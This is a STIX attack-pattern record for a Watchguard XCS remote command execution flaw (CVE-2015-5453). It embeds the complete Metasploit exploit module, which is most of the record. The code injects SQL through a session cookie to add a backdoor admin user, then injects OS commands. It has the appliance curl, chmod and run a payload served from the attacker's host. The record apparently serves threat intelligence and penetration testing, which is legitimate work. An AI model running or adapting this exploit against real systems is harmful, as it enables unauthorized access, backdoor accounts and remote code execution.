{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c09f31b1-2501-4cf9-b68f-59eb900a2cc4",
    "created": "2024-08-14T16:33:45.615062Z",
    "modified": "2024-08-14T16:33:45.615066Z",
    "name": "Watchguard XCS Remote Command Execution",
    "description": " This module exploits two separate vulnerabilities found in the Watchguard XCS virtual appliance to gain command execution. By exploiting an unauthenticated SQL injection, a remote attacker may insert a valid web user into the appliance database, and get access to the web interface. On the other hand, a vulnerability in the web interface allows the attacker to inject operating system commands as the 'nobody' user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/http/watchguard_cmd_exec.rb",
            "external_id": "watchguard_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-5453"
        },
        {
            "source_name": "reference",
            "url": "http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Watchguard XCS Remote Command Execution',\n      'Description'    => %q{\n        This module exploits two separate vulnerabilities found in the Watchguard XCS virtual\n        appliance to gain command execution. By exploiting an unauthenticated SQL injection, a\n        remote attacker may insert a valid web user into the appliance database, and get access\n        to the web interface. On the other hand, a vulnerability in the web interface allows the\n        attacker to inject operating system commands as the 'nobody' user.\n      },\n      'Author'         =>\n        [\n          'Daniel Jensen <daniel.jensen[at]security-assessment.com>' # discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2015-5453'],\n          ['URL', 'http://security-assessment.com/files/documents/advisory/Watchguard-XCS-final.pdf']\n        ],\n      'Platform'       => 'bsd',\n      'Arch'           => ARCH_X64,\n      'Privileged'     => false,\n      'Stance'         => Msf::Exploit::Stance::Aggressive,\n      'Targets'        =>\n        [\n          [ 'Watchguard XCS 9.2/10.0', { }]\n        ],\n      'DefaultOptions' =>\n        {\n          'SSL' => true\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-06-29'\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI', '/']),\n        OptString.new('WATCHGUARD_USER', [true, 'Web interface user account to add', 'backdoor']),\n        OptString.new('WATCHGUARD_PASSWORD', [true, 'Web interface user password', 'backdoor']),\n        OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10]),\n        Opt::RPORT(443)\n      ],\n      self.class\n    )\n  end\n\n  def check\n    #Check to see if the SQLi is present\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),\n      'cookie' => \"sid=1'\"\n     })\n\n     if res && res.body && res.body.include?('unterminated quoted string')\n       return Exploit::CheckCode::Vulnerable\n     end\n\n     Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    # Get a valid session by logging in or exploiting SQLi to add user\n    print_status('Getting a valid session...')\n    @sid = get_session\n    print_good('Successfully logged in')\n\n    # Check if cmd injection works\n    test_cmd_inj = send_cmd_exec('/ADMIN/mailqueue.spl', 'id')\n    unless test_cmd_inj && test_cmd_inj.body.include?('uid=65534')\n      fail_with(Failure::UnexpectedReply, 'Could not inject command, may not be vulnerable')\n    end\n\n    # We have cmd exec, stand up an HTTP server and deliver the payload\n    vprint_status('Getting ready to drop binary on appliance')\n\n    @elf_sent = false\n    # Generate payload\n    @pl = generate_payload_exe\n\n    # Start the server and use primer to trigger fetching and running of the payload\n    begin\n      Timeout.timeout(datastore['HTTPDELAY']) { super }\n    rescue Timeout::Error\n    end\n  end\n\n  def attempt_login(username, pwd_clear)\n    #Attempts to login with the provided user credentials\n    #Get the login page\n    get_login_hash = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/login.spl')\n    })\n\n    unless get_login_hash && get_login_hash.body\n      fail_with(Failure::Unreachable, 'Could not get login page.')\n    end\n\n    #Find the hash token needed to login\n    login_hash = ''\n    get_login_hash.body.each_line do |line|\n      next if line !~ /name=\"hash\" value=\"(.*)\"/\n      login_hash = $1\n      break\n    end\n\n    sid_cookie = (get_login_hash.get_cookies || '').scan(/sid=(\\w+);/).flatten[0] || ''\n    if login_hash == '' || sid_cookie == ''\n      fail_with(Failure::UnexpectedReply, 'Could not find login hash or cookie')\n    end\n\n    login_post = {\n      'u' => \"#{username}\",\n      'pwd' => \"#{pwd_clear}\",\n      'hash' => login_hash,\n      'login' => 'Login'\n    }\n    print_status('Attempting to login with provided credentials')\n    login = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/login.spl'),\n      'method' => 'POST',\n      'encode_params' => false,\n      'cookie' => \"sid=#{sid_cookie}\",\n      'vars_post' => login_post,\n      'vars_get' => {\n        'f' => 'V'\n      }\n    })\n\n\n    unless login && login.body && login.body.include?('<title>Loading...</title>')\n      return nil\n    end\n\n    sid_cookie\n  end\n\n  def add_user(user_id, username, pwd_hash, pwd_clear)\n    #Adds a user to the database using the unauthed SQLi\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/borderpost/imp/compose.php3'),\n      'cookie' => \"sid=1%3BINSERT INTO sds_users (self, login, password, org, priv_level, quota, disk_usage) VALUES(#{user_id}, '#{username}', '#{pwd_hash}', 0, 'server_admin', 0, 0)--\"\n    })\n\n    unless res && res.body\n      fail_with(Failure::Unreachable, \"Could not connect to host\")\n    end\n\n    if res.body.include?('ERROR:  duplicate key value violates unique constraint')\n      print_status(\"Added backdoor user, credentials => #{username}:#{pwd_clear}\")\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to add user to database')\n    end\n\n    true\n  end\n\n  def generate_device_hash(cleartext_password)\n    #Generates the specific hashes needed for the XCS\n    pre_salt = 'BorderWare '\n    post_salt = ' some other random (9) stuff'\n    hash_tmp = Rex::Text.md5(pre_salt + cleartext_password + post_salt)\n    final_hash = Rex::Text.md5(cleartext_password + hash_tmp)\n\n    final_hash\n  end\n\n  def send_cmd_exec(uri, os_cmd, blocking = true)\n    #This is a handler function that makes HTTP calls to exploit the command injection issue\n    unless @sid\n      fail_with(Failure::Unknown, 'Missing a session cookie when attempting to execute command.')\n    end\n\n    opts = {\n      'uri' => normalize_uri(target_uri.path, \"#{uri}\"),\n      'cookie' => \"sid=#{@sid}\",\n      'encode_params' => true,\n      'vars_get' => {\n        'f' => 'dnld',\n        'id' => \";#{os_cmd}\"\n      }\n    }\n\n    if blocking\n      res = send_request_cgi(opts)\n    else\n      res = send_request_cgi(opts, 1)\n    end\n\n    #Handle cmd exec failures\n    if res.nil? && blocking\n      fail_with(Failure::Unknown, 'Failed to exploit command injection.')\n    end\n\n    res\n  end\n\n  def get_session\n    #Gets a valid login session, either valid creds or the SQLi vulnerability\n    username = datastore['WATCHGUARD_USER']\n    pwd_clear = datastore['WATCHGUARD_PASSWORD']\n    user_id = rand(999)\n\n    sid_cookie = attempt_login(username, pwd_clear)\n\n    return sid_cookie unless sid_cookie.nil?\n\n    vprint_error('Failed to login, attempting to add backdoor user...')\n    pwd_hash = generate_device_hash(pwd_clear)\n\n    unless add_user(user_id, username, pwd_hash, pwd_clear)\n      fail_with(Failure::Unknown, 'Failed to add user account to database.')\n    end\n\n    sid_cookie = attempt_login(username, pwd_clear)\n\n    unless sid_cookie\n      fail_with(Failure::Unknown, 'Unable to login with user account.')\n    end\n\n    sid_cookie\n  end\n\n  # Make the server download the payload and run it\n  def primer\n    vprint_status('Primer hook called, make the server get and run exploit')\n\n    #Gets the autogenerated uri from the mixin\n    payload_uri = get_uri\n\n    filename = rand_text_alpha_lower(8)\n    print_status(\"Sending download request for #{payload_uri}\")\n\n    download_cmd = \"/usr/local/sbin/curl -k #{payload_uri} -o /tmp/#{filename}\"\n    vprint_status(\"Telling appliance to run #{download_cmd}\")\n    send_cmd_exec('/ADMIN/mailqueue.spl', download_cmd)\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    chmod_cmd = \"chmod +x /tmp/#{filename}\"\n    vprint_status('Chmoding the payload...')\n    send_cmd_exec(\"/ADMIN/mailqueue.spl\", chmod_cmd)\n\n    exec_cmd = \"/tmp/#{filename}\"\n    vprint_status('Running the payload...')\n    send_cmd_exec('/ADMIN/mailqueue.spl', exec_cmd, false)\n\n    vprint_status('Finished primer hook, raising Timeout::Error manually')\n    raise(Timeout::Error)\n  end\n\n  #Handle incoming requests from the server\n  def on_request_uri(cli, request)\n    vprint_status(\"on_request_uri called: #{request.inspect}\")\n    print_status('Sending the payload to the server...')\n    @elf_sent = true\n    send_response(cli, @pl)\n  end\n\n  def autofilter\n    true\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-29",
    "x_mitre_platforms": [
        "bsd'"
    ]
}